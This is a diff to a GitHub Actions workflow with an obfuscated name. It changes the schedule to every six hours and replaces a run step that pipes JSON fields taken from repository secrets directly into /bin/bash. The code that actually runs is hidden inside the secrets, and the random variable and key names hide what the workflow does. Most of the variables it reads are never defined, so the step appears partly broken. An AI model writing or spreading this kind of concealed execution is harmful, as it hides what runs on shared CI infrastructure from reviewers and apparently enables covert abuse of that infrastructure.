@@ -1,8 +1,9 @@
 name: zhongxiaoyan3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
+    - cron: '31 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhongxiaoyan3456
         env:
-          nw468: ${{ secrets.nw468 }}
+          ttsl06014: ${{ secrets.ttsl06014 }}
         run: |
-          echo $nw468 | jq -r .j00396 | /bin/bash
-          echo $pk2036 | jq -r .pmmg728 | /bin/bash
-          echo $mtd43947 | jq -r .tt7170 | /bin/bash
-          echo $wvzns85047 | jq -r .atn51585 | /bin/bash
-          echo $pr3 | jq -r .msfop148 | /bin/bash
-          echo $tnawx41 | jq -r .ewj83438 | /bin/bash
-          echo $st39 | jq -r .n9010 | /bin/bash
+          echo $ttsl06014 | jq -r .dy90 | /bin/bash
+          echo $xf8 | jq -r .fjd37 | /bin/bash
+          echo $xh1026 | jq -r .vtgir81 | /bin/bash
+          echo $k947 | jq -r .o138 | /bin/bash
+          echo $aq1244 | jq -r .gmry7 | /bin/bash
 
